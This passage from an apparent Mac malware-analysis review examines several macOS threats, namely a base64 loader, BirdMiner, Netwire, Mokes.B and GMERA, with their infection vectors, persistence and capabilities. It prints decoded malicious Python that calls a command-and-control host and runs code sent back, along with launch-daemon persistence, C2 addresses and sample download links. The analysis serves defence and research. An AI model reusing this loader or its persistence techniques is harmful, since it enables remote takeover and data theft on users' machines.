IyAtKi0gY29kaW5n...AgcmFpc2UK | base64 --decode | python\n 9fi\n10fi\n\n```\nAfter connecting to `usb.mine.nu/p.php and checking for a response containing the string` `\"open\" and`\nchecking if a process named `HEYgiNb is running, script decodes a large blog of base64 encoded data. This`\ndecoded data is then executed via python.\n\nAfter decoding the data, as expected, it turns out to be a python code:\n```\n 1# -*- coding: utf-8 -* 2import urllib2\n 3from base64 import b64encode, b64decode\n 4import getpass\n 5from uuid import getnode\n 6from binascii import hexlify\n 7\n 8def get_uid():\n 9  return hexlify(getpass.getuser() + \"-\" + str(getnode()))\n10\n11LaCSZMCY = \"Q1dG4ZUz\"\n12data = {\n13  \"Cookie\": \"session=\" + b64encode(get_uid()) + \"-eyJ0eXBlIj...ifX0=\",\n14  \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/65.0.3325.181 Safari/537.36\"\n15}\n16\n17try:\n18  request = urllib2.Request(\"http://zr.webhop.org:1337\", headers=data)\n19  urllib2.urlopen(request).read()\n20except urllib2.HTTPError as ex:\n21  if ex.code == 404:\n22    exec(b64decode(ex.read().split(\"DEBUG:\\n\")[1].replace(\"DEBUG-->\", \"\")))\n23  else:\n24    raise\n\n```\nThis (decoded) python code matches the `HEYgiNb file described in DrWeb‚Äôs analysis`\n[(‚ÄúMac.BackDoor.Siggen.20‚Äù). (Also recall the](https://vms.drweb.com/virus/?i=17783537) `c.sh checks for the presence of a process named` `HEYgiNb ).`\n\nWe can also locate this file on VirusTotal: `HEYgiNb.py. and note that it is flagged by multiple engines:`\n\n\n-----\n\nTaking a closer look at this python code ( HEYgiNb ), we see the `Cookie parameter contains (more) base64`\nencoded data, which we can decode:\n```\n{\"type\": 0, \"payload_options\": {\"host\": \"zr.webhop.org\", \"port\": 1337}, \"loader_options\":\n{\"payload_filename\": \"yhxJtOS\", \"launch_agent_name\": \"com.apple.HEYgiNb\", \"loader_name\":\n\"launch_daemon\", \"program_directory\": \"~/Library/Containers/.QsxXamIy\"}}\n\n```\nFollowing a request to `http://zr.webhop.org on port` `1337, the python code base64 decodes and`\nexecutes data extracted from the server‚Äôs ( 404 ) response: \\\n\n`exec(b64decode(ex.read().split(\"DEBUG:\\n\")[1].replace(\"DEBUG-->\", \"\")))`.\nUnfortunately the server `http://zr.webhop.org is no longer serving up this final-stage payload. However,`\n[@philofishal notes that: ‚ÄúFurther analysis shows that the script leverages a public post exploitation kit,](https://twitter.com/philofishal)\n```\nEvil.OSX to install a backdoor.‚Äù\n\n```\n‚Ä¶and of course, the attackers could swap out the python payload (server-side) anytime, to execute whatever\nthey want on the infected systems!\n\n\\\n\n\n-----\n\n## üëæ OSX.BirdMiner ( OSX.LoudMiner )\n\nBirdMiner (or LoudMiner) delivers linux-based cryptominer, that runs on macOS via QEMU emulation.\n\n[Download: OSX.BirdMiner (password:](https://objective-see.com/downloads/malware/BirdMiner.zip) `infect3d )`\n\nWriteups:\n\n[‚ÄúNew Mac cryptominer Malwarebytes detects as Bird Miner runs by emulating Linux‚Äù](https://blog.malwarebytes.com/mac/2019/06/new-mac-cryptominer-malwarebytes-detects-as-bird-miner-runs-by-emulating-linux/)\n\n[‚ÄúLoudMiner: Cross‚Äëplatform mining in cracked VST software‚Äù](https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/)\n\n\\\n\nInfection Vector: Pirated Applications\n\n`BirdMiner` was distributed via pirated (cracked) applications on the the \"VST Crack\" website. Thomas Reed\n([@thomasareed](https://twitter.com/thomasareed)) the well-known Mac malware analyst and author of the\n\n[\"New Mac cryptominer... Bird Miner\"](https://blog.malwarebytes.com/mac/2019/06/new-mac-cryptominermalwarebytes-detects-as-bird-miner-runs-by-emulating-linux/) writeup, states:\n\n\"Bird Miner has been found in a cracked installer for the high-end music production software Ableton Live\"\n-Thomas Reed\n\n[ESET, who also analyzed the malware, discussed its infection mechanism as well. Specifically their research](https://www.welivesecurity.com/2019/06/20/loudminer-mining-cracked-vst-software/)\nuncovered almost 100 pirated applications all related to digital audio / virtual studio technology (VST) that, (like\nthe cracked Ableton Live software package) likely contained the `BirdMiner malware.`\n\nOf course, users who downloaded and installed these pirated applications, would become infected with the\nmalware.\n\nIt should be noted that the downloaded package ( Ableton Live Suite 10.1.pkg ) is unsigned, thus will be\nblocked by macOS:\n\n\n-----\n\nRather amusingly though, an `Instructions.txt file explicitly tells user how to (manually) sidestep this:`\n```\nImportant note: If you receive the following message:\n\"Can't be opened because it is from an unidentified developer.\"\nGo into: \"System Preferences\" > \"Security and Privacy\" > \"General\" and \"Allow\" the installation with\n\"Open Anyway\".\n\n```\nPersistence: Launch Daemons\n\nOne of the pirated applications that is infected with `OSX.BirdMiner is Ableton Live, ‚Äúa digital audio`\nworkstation for macOS‚Äù. The infected application is distributed as a standard disk image;\n\n```\nAbleton.Live.10.Suite.v10.1.dmg\n\n```\n\nWhen the disk image is mounted and the application installer ( Ableton Live Suite 10.1.pkg ) is executed it\nwill first request the user‚Äôs credentials:\n\nNow, with root privileges `BirdMiner can persists several launch daemons. This can be passively observed by`\nvia Objective-See‚Äôs [FileMonitor utility:](https://objective-see.com/products/utilities.html#FileMonitor)\n\n\n-----\n\n```\n{\n \"event\": \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n \"timestamp\": \"2019-12-03 06:36:21 +0000\",\n \"file\": {\n  \"destination\": \"/Library/LaunchDaemons/com.decker.plist\",\n  \"process\": {\n   \"pid\": 1073,\n   \"path\": \"/bin/cp\",\n   \"uid\": 0,\n   \"arguments\": [],\n   \"ppid\": 1000,\n   \"ancestors\": [1000, 986, 969, 951, 1],\n   \"signing info\": {\n    \"csFlags\": 603996161,\n    \"signatureIdentifier\": \"com.apple.cp\",\n    \"cdHash\": \"D2E8BBC6DB7E2C468674F829A3991D72AA196FD\",\n    \"isPlatformBinary\": 1\n   }\n  }\n }\n}\n...\n{\n \"event\": \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n \"timestamp\": \"2019-12-03 06:36:21 +0000\",\n \"file\": {\n  \"destination\": \"/Library/LaunchDaemons/com.tractableness.plist\",\n  \"process\": {\n   \"pid\": 1077,\n   \"path\": \"/bin/cp\",\n   \"uid\": 0,\n   \"arguments\": [],\n   \"ppid\": 1000,\n   \"ancestors\": [1000, 986, 969, 951, 1],\n   \"signing info\": {\n    \"csFlags\": 603996161,\n    \"signatureIdentifier\": \"com.apple.cp\",\n    \"cdHash\": \"D2E8BBC6DB7E2C468674F829A3991D72AA196FD\",\n    \"isPlatformBinary\": 1\n   }\n  }\n }\n}\n\n```\n\\\nThe names of the property lists (com.decker.plist, com.tractableness.plist) and the names of the files they\npersist are randomly generated. See [\"New Mac cryptominer... Bird Miner\"]\n(https://blog.malwarebytes.com/mac/2019/06/new-mac-cryptominer-malwarebytes-detects-as-bird-miner-runsby-emulating-linux/) for more details.\n\nThe `com.decker.plist launch daemon persists a file named` `vicontiel (placed in` `/usr/local/bin/ ):`\n```\n# defaults read /Library/LaunchDaemons/com.decker.plist \n{\n  KeepAlive = 1;\n  Label = \"com.decker.plist\";\n  ProgramArguments =   (\n    \"/usr/local/bin/vicontiel\"\n  );\n  RunAtLoad = 1;\n}\n\n```\n\n-----\n\nSimilarly, the `com.tractableness.plist launch daemon persists a file named` `Tortulaceae (again, in`\n```\n/usr/local/bin/ ):\n# defaults read /Library/LaunchDaemons/com.tractableness.plist \n{\n  KeepAlive = 1;\n  Label = \"com.tractableness.plist\";\n  ProgramArguments =   (\n    \"/usr/local/bin/Tortulaceae\"\n  );\n  RunAtLoad = 1;\n}\n\n```\n\\\nAs `RunAtLoad is set to 1 (true) in both property list files, the persisted files ( vicontiel, and` `Tortulaceae )`\nwill be automatically (re)launched by the OS each time the infected system is restarted.\n\nCapabilities: Cryptomining\n\nBoth files ( vicontiel, and `Tortulaceae, though recall these names are randomly generated), are bash`\nscripts:\n```\n# file /usr/local/bin/vicontiel\n/usr/local/bin/vicontiel: Bourne-Again shell script text executable, ASCII text\n\n```\nThe `vicontiel script will either unload the` `com.tractableness.plist launch daemon if the user has`\nActivity Monitor running (likely for stealth reasons), or if not, will load the plist:\n```\n# less /usr/local/bin/viridian\n...\npgrep \"Activity Monitor\"\nif [ $? -eq 0 ]; then\n launchctl unload -w /Library/LaunchDaemons/com.tractableness.plist\n sleep 900\nelse\n launchctl load -w /Library/LaunchDaemons/com.tractableness.plist\nfi\n\n```\nThe `Tortulaceae (executed by the` `com.tractableness.plist ) will similarly unload the plist if Activity`\nMonitor is running. However, if not, it will execute the following: `/usr/local/bin/voteen -m 3G -accel`\n```\nhvf,thread=multi -smp cpus=2 --cpu host /usr/local/bin/archfounder -display none\n\n```\n[As noted by Thomas Reed in his writeup,](https://blog.malwarebytes.com/mac/2019/06/new-mac-cryptominer-malwarebytes-detects-as-bird-miner-runs-by-emulating-linux/) `/usr/local/bin/voteen, is actually the open-source emulator`\nQEMU!\n```\n$ strings -a /usr/local/bin/voteen\nQEMU emulator version 4.0.92 (v4.1.0-rc2-dirty)\nCopyright (c) 2003-2019 Fabrice Bellard and the QEMU Project developers\n...\n\n```\n\n-----\n\nQEMU is able to execute (via emulation) Linux binaries on systems that are not Linux (such as macOS). This\nbegs the question, what is it executing?\n\nThe `file command (well, and Reed‚Äôs` [writeup) provide the answer:](https://blog.malwarebytes.com/mac/2019/06/new-mac-cryptominer-malwarebytes-detects-as-bird-miner-runs-by-emulating-linux/)\n```\n$ file /usr/local/bin/archfounder \n/usr/local/bin/archfounder: QEMU QCOW Image (v3), 527400960 bytes\n\n```\nThe `archfounder file (that is passed into QEMU ( voteen )), is a QEMU QCOW image, which (thanks again`\nto Reed‚Äôs [analysis) we know is: ‚Äúa bootable [Tiny Core] Linux system.‚Äù](https://blog.malwarebytes.com/mac/2019/06/new-mac-cryptominer-malwarebytes-detects-as-bird-miner-runs-by-emulating-linux/)\n\nOk, so we‚Äôve got a peristent macOS launch daemon, that‚Äôs executing a bash script, which (via QEMU), is\nbooting a Linux system. But why? Reed again has the answer:\n\n\"_[the] `bootlocal.sh` file contains commands [that are automatically executed during startup] to get xmrig\nup and running:_\n```\n   1#!/bin/sh\n   2# put other system startup commands here\n   3/mnt/sda1/tools/bin/idgenerator 2>&1 > /dev/null\n   4/mnt/sda1/tools/bin/xmrig_update 2>&1 > /dev/null\n   5/mnt/sda1/tools/bin/ccommand_update 2>&1 > /dev/null\n   6/mnt/sda1/tools/bin/ccommand 2>&1 > /dev/null\n   7/mnt/sda1/tools/bin/xmrig\n\n```\n‚Ä¶thus, as soon as the Tiny Core system boots up, xmrig launches without ever needing a user to log in.\"\n\nSo all that work to persist a linux-version of `xmrig (a well known cryptocurrency miner?) Yes! #yolo?`\n\nThere are macOS builds of xmrig, meaning the attacker could have simply persisted such a build and thus\nskipped the entire QEMU/Linux aspect of this attack.\n\n\\\n\n## üëæ OSX.Netwire\n\n`Netwire` is a fully-featured persistent backdoor. Interestinly, while `Netwire.A` appeared on Apple's radar a few\nyears ago, it only publicly emerged in 2019.\n\n[Download: OSX.Netwire (password:](https://objective-see.com/downloads/malware/Wirenet%20(NetWeirdRC).zip) `infect3d )`\n\nWriteups:\n\n[‚ÄúA Firefox 0day Drops a macOS Backdoor (OSX.Netwire.A)‚Äù](https://objective-see.com/blog/blog_0x43.html)\n\n\n-----\n\n\\\n\n\n[Potent Firefox 0 day used to install undetected backdoors on Macs](https://arstechnica.com/information-technology/2019/06/potent-firefox-0day-used-to-install-undetected-backdoors-on-macs/)\n\nInfection Vector: Browser 0day\n\n\nIt all started with an email sent our way, from a user (working at a crypto-currency exchange) who‚Äôs Mac had\nbeen infected ‚Ä¶apparently via a browser 0day!\n\n\"_Last week Wednesday I was hit with an as-yet-unknown Firefox 0day that somehow dropped a binary\nand executed it on my mac (10.14.5) \\ \\ Let me know if you would be interested in analysing the binary,\nmight be something interesting in there wrt bypassing osx gatekeeper._\"\n\nMoreover, the user was able to provide a copy of the email that contained a link to the malicious website\n( people.ds.cam.ac.uk ):\n\nDear XXX,\nMy name is Neil Morris. I‚Äôm one of the Adams Prize Organizers.\n\nEach year we update the team of independent specialists who could assess the quality of the competing\nprojects: [http://people.ds.cam.ac.uk/nm603/awards/Adams_Prize](http://people.ds.cam.ac.uk/nm603/awards/Adams_Prize)\n\nOur colleagues have recommended you as an experienced specialist in this field.\n\nWe need your assistance in evaluating several projects for Adams Prize.\n\nLooking forward to receiving your reply.\n\nBest regards,\nNeil Morris\nUnfortunately at the time our analysis, the link ( people.ds.cam.ac.uk/nm603/awards/Adams_Prize )\nreturned a `404 Not Found :`\n```\n$ curl http://people.ds.cam.ac.uk/nm603/awards/Adams_Prize\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL /nm603/awards/Adams_Prize was not found on this server.</p>\n<hr>\n<address>Apache/2.4.7 (Ubuntu) Server at people.ds.cam.ac.uk Port 80</address>\n</body></html>\n</pre>\n\n```\n[A few days later a security researcher at Coinbase, Philip Martin, posted an interesting thread on twitter,](https://twitter.com/SecurityGuyPhil)\ndetailing the same attack:\n\n\n-----\n\n5/ Hashes (sha1):\nb639bca429778d24bda4f4a40c1bbc64de46fa79\n23017a55b3d25a2597b7148214fd8fb2372591a5\n\nC2 IPs:\n89.34.111.113:443\n185.49.69.210:80\n\n[‚Äî Philip Martin (@SecurityGuyPhil) June 19, 2019](https://twitter.com/SecurityGuyPhil/status/1141466339518767104?ref_src=twsrc%5Etfw)\n\nThis (Firefox) 0day, has now been patched as CVE-2019-11707, and covered in various articles such as:\n\n[‚ÄúMozilla patches Firefox zero-day abused in the wild‚Äù](https://www.zdnet.com/article/mozilla-patches-firefox-zero-day-abused-in-the-wild/)\n[‚ÄúMozilla Patches Firefox Critical Flaw Under Active Attack‚Äù](https://threatpost.com/mozilla-patches-firefox-critical-flaw-under-active-attack/145814/)\n\n[For more information on the technical details of this browser bug, check out Samuel Gro√ü‚Äôs twitter thread:](https://twitter.com/5aelo)\n\nThanks to [@coinbase I've had a chance to look at the in-the-wild exploit for the recent Firefox 0day (the](https://twitter.com/coinbase?ref_src=twsrc%5Etfw)\nRCE) that they caught. Tl;dr: it looks a lot like a bug collision between Fuzzilli and someone manually\nauditing for bugs. My notes:\n\n[‚Äî Samuel Gro√ü (@5aelo) June 25, 2019](https://twitter.com/5aelo/status/1143548622530895873?ref_src=twsrc%5Etfw)\n\nAs the bug was exploited as a 0day vulnerability, if any user visited the malicious site `people.ds.cam.ac.uk`\nvia Firefox (even fully-patched!), the page would ‚Äúthrow‚Äù that exploit and automatically infect the Mac computer.\nNo other user-interaction required!\n\nWith the ability to download and execute arbitrary payloads, the attackers could install whatever macOS\nmalware they desired! One of the payloads they chose to install was `OSX.Netwire (on other systems, the`\nattacker choose to install OSX.Mokes).\n\nWhat about File Quarantine/Gatekeeper? Unfortunately those protection mechanisms only come into play, if the\nbinary / application contains the ‚Äúquarantine attribute‚Äù. Via an exploit, an attacker can ensure their payload, of\ncourse, does not contain this attribute (thus neatly avoiding Gatekeeper): \\\n\n\n-----\n\n\\\n[For details on File Quarantine/Gatekeeper see: ‚ÄúGatekeeper Exposed‚Äù](https://speakerdeck.com/patrickwardle/shmoocon-2016-gatekeeper-exposed-come-see-conquer)\n\n[..also note, that in macOS 10.15 (Catalina), File Quarantine/Gatekeeper have been improved, and thus may](https://eclecticlight.co/2019/06/12/grokking-gatekeeper-in-catalina/)\n(now) thwart this attack vector!\n\n\\\n\nPersistence: Login Item & Launch Agent\n\nA quick peek at the malware‚Äôs disassembly reveals an launch agent plist, embedded directly within the binary:\n```\nmemcpy(esi, \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE plist PUBLIC \\\"-//Apple\nComputer//DTD PLIST 1.0//EN\\n\\t\\\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\\">\\n<plist\nversion=\\\"1.0\\\">\\n<dict>\\n  <key>Label</key>\\n  <string>%s</string>\\n  \n<key>ProgramArguments</key>\\n<array>\\n    <string>%s</string>\\n  </array>\\n  \n<key>RunAtLoad</key>\\n  <true/>\\n  <key>KeepAlive</key>\\n  <%s/>\\n</dict>\\n</plist>\");\n...    \neax = getenv(\"HOME\");\neax = __snprintf_chk(&var_6014, 0x400, 0x0, 0x400, \"%s/Library/LaunchAgents/\", eax);\n...\neax = __snprintf_chk(edi, 0x400, 0x0, 0x400, \"%s%s.plist\", &var_6014, 0xe5d6);\n\n```\nSeems reasonable to assume the malware will persist as launch agent.\n\nHowever, it also appears to contain logic to persist as a login item (note the call to the\n```\nLSSharedFileListInsertItemURL API):\n\n```\n\n-----\n\n```\n    __ p _ ( _,,,, pp, _, _ );\neax = CFURLCreateFromFileSystemRepresentation(0x0, &var_6014, eax, 0x1);\n...\neax = LSSharedFileListCreate(0x0, **_kLSSharedFileListSessionLoginItems, 0x0);\n...\neax = LSSharedFileListInsertItemURL(eax, **_kLSSharedFileListItemLast, 0x0, 0x0, edi, 0x0, 0x0);\n\n```\nExecuting the malware (in VM), shows that it persists twice! First as launch agent ( com.mac.host.plist ),\nand then as a login item.\n\nLet‚Äôs take a peek at the launch agent plist, `com.mac.host.plist :`\n```\n$ cat ~/Library/LaunchAgents/com.mac.host.plist\n{\n  KeepAlive = 0;\n  Label = \"com.mac.host\";\n  ProgramArguments =   (\n    \"/Users/user/.defaults/Finder.app/Contents/MacOS/Finder\"\n  );\n  RunAtLoad = 1;\n}\n\n```\nAs the `RunAtLoad key set to` `1 ( true ), the OS will automatically launch the binary specified in the`\n```\nProgramArguments array ( ~/.defaults/Finder.app/Contents/MacOS/Finder ) each time the user logs in.\n\n```\nThe login item will also ensure the malware is launched. Login items however show up in the UI, clearly\ndetracting from the malware‚Äôs stealth:\n\nIs persisting twice better than once? Not really, especially if you are running Objective-See‚Äôs lovely tools such\nas [BlockBlock which detects both persistence attempts:](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\nFor details on persisting as a login item (and the role of backgroundTaskManagementAgent), see our recent\n[blog post: ‚ÄúBlock Blocking Login Items‚Äù.](https://objective-see.com/blog/blog_0x31.html)\n\n\\\n\nCapabilities: (fully-featured) backdoor.\n\nVia (what was) a Firefox 0day, attackers remotely infected macOS systems with `OSX.Netwire . Persistenly`\ninstalling the malware ( Finder.app ) afforded the attackers full remote access to compromised systems. Here,\nwe briefly discuss the specific capabilities of the `OSX.Netwire.A backdoor.`\n\nFor a detailed technical analysis of Netwire (that focuses specifically on uncovering its capabilities) see:\n\n[\"Part II: A Firefox 0day drops a macOS Backdoor (OSX.Netwire.A)\"](https://objectivesee.com/blog/blog_0x44.html)\nAfter extracting the address of its command and control server from an encryted (embedded) config file,\n```\nNetwire connects to said server for tasking.\n\n```\n\n-----\n\n```\n$ pp\n(lldb) process launch --stop-at-entry\n(lldb) b 0x00007658\nBreakpoint 1: where = Finder`Finder[0x00007658], address = 0x00007658\n(lldb) c\nProcess 1130 resuming\nProcess 1130 stopped (stop reason = breakpoint 1.1)\n(lldb) x/100xs 0x0000e2f0 --force\n0x0000e2f0: \"\"\n...\n0x0000e2f8: \"89.34.111.113:443;\"\n0x0000e4f8: \"Password\"\n0x0000e52a: \"HostId-%Rand%\"\n0x0000e53b: \"Default Group\"\n0x0000e549: \"NC\"\n0x0000e54c: \"-\"\n0x0000e555: \"%home%/.defaults/Finder\"\n0x0000e5d6: \"com.mac.host\"\n0x0000e607: \"{0Q44F73L-1XD5-6N1H-53K4-I28DQ30QB8Q1}\"\n\n```\nThough this server ( 89.34.111.113 ) is now offline, static analysis reveals that the malware expects a\nresponse containing tasking data, including an integer value of the command to execute. This integer is used to\nindex into an array ( 0x0000d1b0 ) of supported commands:\n```\nmov    dl, byte [esp+ecx+0x78ac+dataFromServer] \n...\ndec    dl\ncmp    dl, 0x42\nja     loc_6a10\n...\nmovzx   eax, dl\njmp    dword [switch_table_d1b0+eax*4] \n\n```\nBy statically analyzing the code referenced in this array we can uncover `Netwire ‚Äôs capabilities.`\n\nFor example, ‚Äúcommand‚Äù `0x1A ( 26d ) will rename a file:`\n```\n0x00004f37     push    ebx \n0x00004f38     push    edi\n0x00004f39     call    imp___symbol_stub__rename\n\n```\n‚Ä¶while ‚Äúcommand‚Äù `0x1B ( 27d ) will delete a file via the unlink API:`\n```\n0x00004f5e     sub    esp, 0xc                     \n0x00004f61     push    esi\n0x00004f62     mov    edi, ecx\n0x00004f64     call    imp___symbol_stub__unlink\nOSX.Netwire also can be remotely tasked to interact with process(es), for example listing them (‚Äúcommand‚Äù\n\n```\n\n-----\n\n```\n;,\n...\npush    esi\npush    edi\npush    0x0\npush    0x1\ncall    imp___symbol_stub__proc_listpids\n\n```\n‚Ä¶or killing them (‚Äúcommand‚Äù `0x2C,` `44d ):`\n```\n; case 0x2C,\n...\n0x000056fa     push    0x9\n0x000056fc     push    eax\n0x000056fd     call    imp___symbol_stub__kill\n\n```\nVia ‚Äúcommand‚Äù `0x19 ( 25d ) the malware will invoke a helper method,` `0x0000344c which will fork then`\nexecv a process:\n```\neax = fork();\nif (((eax == 0xffffffff ? 0x1 : 0x0) != (eax <= 0x0 ? 0x1 : 0x0)) && (eax == 0x0)) {\n    execv(esi, &var_18);\n    eax = exit(0x0);\n}\n\n```\nThe malware can also interact with the UI, for example to capture a screen shot. When the malware receives\n‚Äúcommand‚Äù `0x37 ( 55d ), it invokes the` `CGMainDisplayID and` `CGDisplayCreateImage to create an`\nimage of the user‚Äôs desktop:\n```\n0x0000622c     movss   dword [esp+0x34ac+var_101C], xmm0\n0x00006235     call    imp___symbol_stub__CGMainDisplayID\n0x0000623a     sub    esp, 0xc\n0x0000623d     push    eax\n0x0000623e     call    imp___symbol_stub__CGDisplayCreateImage\n\n```\nInterestingly it also appears that `OSX.Netwire may be remotely tasked to generate synthetic keyboard and`\nmouse events. Neat!\n\nSpecifically synthetic keyboard events are created and posted when ‚Äúcommand‚Äù `0x34 ( 52d ) is received from`\nthe c&c server. To create and post the event, the malware invokes the `CGEventCreateKeyboardEvent and`\n```\nCGEventPost APIs.\n\n```\nSynthetic mouse events (i.e. clicks, moves, etc) are generated in response to ‚Äúcommand‚Äù `0x35 ( 53d ):`\n```\nvoid sub_9a29() {\n edi = CGEventCreateMouseEvent(0x0, edx, ...);\n CGEventSetType(edi, edx);\n CGEventPost(0x0, edi);\n return;\n}\n\n```\nFinally, via ‚Äúcommand‚Äù `0x7 it appears that the malware can be remotely instructed to uninstall itself. Note the`\ncalls to unlink to remove the launch agent plist and the malware‚Äôs binary image, and the call to\n```\nLSSharedFileListItemRemove to remove the login item:\n\n```\n\n-----\n\n```\n__ p _ ( _,,,,\n       \"%s/Library/LaunchAgents/%s.plist\", getenv(\"HOME\"), 0xe5d6);\neax = unlink(&var_284C);\nif (getPath() != 0x0) {\n  unlink(esi);\n}\nLSSharedFileListItemRemove(var_34A4, esi);\n\n```\n\\\n\n## üëæ OSX.Mokes.B\n\nMokes.B is a new variant of the Mokes malware; a fully-featured macOS backdoor.\n\n[Download: OSX.Mokes (password:](https://objective-see.com/downloads/malware/Mokes.zip) `infect3d )`\n\nWriteups:\n\n[‚ÄúA Firefox 0day Drops Another macOS Backdoor (OSX.Mokes.B)‚Äù](https://objective-see.com/blog/blog_0x45.html)\n\n[‚ÄúPotent Firefox 0-day used to install undetected backdoors on Macs‚Äù](https://arstechnica.com/information-technology/2019/06/potent-firefox-0day-used-to-install-undetected-backdoors-on-macs/)\n\n\\\n\nInfection Vector: Browser 0day\n\nIn our previous discussion of `OSX.NetWire, we noted that Coinbase researcher,` [Philip Martin, tweeted the](https://twitter.com/SecurityGuyPhil)\nfollowing about an attack that leveraged a Firefox 0day to target macOS users:\n\n5/ Hashes (sha1):\n\nb639bca429778d24bda4f4a40c1bbc64de46fa79\n\n23017a55b3d25a2597b7148214fd8fb2372591a5\n\nC2 IPs:\n\n89.34.111.113:443\n\n185.49.69.210:80\n\n[‚Äî Philip Martin (@SecurityGuyPhil) June 19, 2019](https://twitter.com/SecurityGuyPhil/status/1141466339518767104?ref_src=twsrc%5Etfw)\n\nThe (first) hash he mentioned, `b639bca429778d24bda4f4a40c1bbc64de46fa79 turned out to be new variant`\nof Mokes that we named OSX Mokes B : \\\n\n\n-----\n\n\\\nFor more details on the Firefox 0day see our discussion (above) on [`OSX.Netwire`](#osx-netwire)\n\n\\\n\nPersistence: Launch Agent\n\nWhen executed, `OSX.Mokes.B persists itself as a launch agent ( quicklookd.plist ):`\n```\n$ defaults read ~/Library/LaunchAgents/quicklookd.plist \n{\n  KeepAlive = 1;\n  Label = quicklookd;\n  ProgramArguments =   (\n    \"/Users/user/Library/Dropbox/quicklookd\"\n  );\n  RunAtLoad = 1;\n}\n\n```\nAs the launch agent ( quicklookd.plist ) has the `RunAtLoad key set (to 1), the OS will automatically launch`\nthe specified binary ( /Users/user/Library/Dropbox/quicklookd ), each time the user logs in. This provides\nthe malware persistence.\n\nInterestingly directly embedded within `Mokes are other names for both the plist and the for name of the`\n(installed) malware. It appears to (rather) randomly and dynamically select names for these, likely in order to\ncomplicate signature-based detections\n\n\n-----\n\nFor example restoring the (analysis) VM to a pristine state and (re)running the malware, results in the malware\nselecting one of the other strings pairs (e.g. `App Store /` `storeaccountd ) for installation and persistence`\npurposes:\n\nCapabilities: Fully-featured backdoor\n\nWe previously noted this sample is a new variant of the `OSX.Mokes, a fact that was orginally pointed out by`\n[Vitali Kremez:](https://twitter.com/VK_Intel)\n\n\n-----\n\n[Another detail related to #OSX](https://twitter.com/hashtag/OSX?src=hash&ref_src=twsrc%5Etfw) [#Backdoor ( keys/bot ) is likely linked to @Securelist](https://twitter.com/hashtag/Backdoor?src=hash&ref_src=twsrc%5Etfw)\n\"Backdoor.OSX.Mokes\" as (1) (screen, file, audio, keystroke grab).\nAdditional possible 0-day IOCs are in this reportÛæì• (2) h/t [@Sh1ttyKids 1ÔøΩ](https://twitter.com/Sh1ttyKids?ref_src=twsrc%5Etfw) [https://t.co/veNbcpnkkY](https://t.co/veNbcpnkkY)\n2ÔøΩ [https://t.co/sc40cl18ym](https://t.co/sc40cl18ym) [pic.twitter.com/q8NnpctDOZ](https://t.co/q8NnpctDOZ)\n\n[‚Äî Vitali Kremez (@VK_Intel) June 21, 2019](https://twitter.com/VK_Intel/status/1141956686808268801?ref_src=twsrc%5Etfw)\n\nThe orginal `OSX.Mokes, is cross-platform, fully-featured backdoor that was discovered by Kaspersky in 2016.`\n[In an excellent writeup, ‚ÄúThe Missing Piece ‚Äì Sophisticated OS X Backdoor Discovered‚Äù, they detailed](https://securelist.com/the-missing-piece-sophisticated-os-x-backdoor-discovered/75990/)\n```\nOSX.Moke s installation, persistence, network comms and rather impressive capabilities (screen capture, audio\n\n```\ncapture, document discovery & exfiltration, and more).\n\nThough there a some differences between the orginal `Mokes samples and` `OSX.Mokes.B, their capabilities`\nlargely overlap. Such capabilities include:\n\ncapturing screen/mic/camera\nsearching for (office) documents\nmonitoring for removable media (USB devices)\nthe execution of abitrary commands (on an infected system)\n\nTo record the user, the malware utilizes popular QT framework. This cross-platform framework contains\nmacOS-specific webcam recording code:\n\n\n-----\n\n\\\n\n## üëæ OSX.GMERA ( A / B )\n\nGMERA is a Lazarus group trojan, that persistently exposes a shell to remote attackers\n\n[Download: OSX.GMERA (password:](https://objective-see.com/downloads/malware/GMERA.zip) `infect3d )`\n\nWriteups:\n\n[‚ÄúMac Malware that Spoofs Trading App Steals User Information, Uploads it to Website‚Äù](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/)\n\n[‚ÄúDetecting macOS.GMERA Malware Through Behavioral Inspection‚Äù](https://labs.sentinelone.com/detecting-macos-gmera-malware-through-behavioral-inspection/)\n\n\\\n\nInfection Vector: Fake Cryptocurrency App\n\n\n-----\n\nThe de facto infection mechanism of the Lazarus group, is to create fake crypto currency applications (often\nbacked by a legitimate looking website), and coerce users installed said applications.\n\n[In a previous (albeit related) attack in 2018, Kaspersky wrote:](https://securelist.com/operation-applejeus/87553/)\n\n\"The victim had been infected with the help of a trojanized cryptocurrency trading application, which had\nbeen recommended to the company over email. It turned out that an unsuspecting employee of the\ncompany had willingly downloaded a third-party application from a legitimate looking website [Celas LLC].\nThe Celas LLC ‚Ä¶looks like the threat actor has found an elaborate way to create a legitimate looking\nbusiness and inject a malicious payload into a ‚Äúlegitimate looking‚Äù software update mechanism. Sounds\nlogical: if one cannot compromise a supply chain, why not to make fake one?\"\n\nI also talked about this previous attack in several conference talks:\n\n[In 2019, Lazarus group continued this trend, as noted by TrendMicro:](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/)\n\n\"However, their popularity has led to their abuse by cybercriminals who create fake trading apps as lures\nfor unsuspecting victims to steal their personal data. We recently found and analyzed an example of such\nan app, which had a malicious malware variant that disguised itself as a legitimate Mac-based trading app\ncalled Stockfolio.\"\n\n\n-----\n\nThus if a targeted user downloads and runs the `Stockfolio application, they will become infected with`\n```\nOSX.GMERA \\\n\n```\nPersistence: Launch Agent\n\nIn their [report TrendMicro notes that only the second version of](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/) `GMERA ( B ) persists.`\n\nTake a peak at the trojanized `Stockfolio application bundle of` `OSX.GMERA.B reveals the presence of a file`\nnamed `run.sh in the` `Resources/ directory:`\n\nThis script will install a persistent (hidden) launch agent to:\n```\n~/Library/LaunchAgents/.com.apple.upd.plist 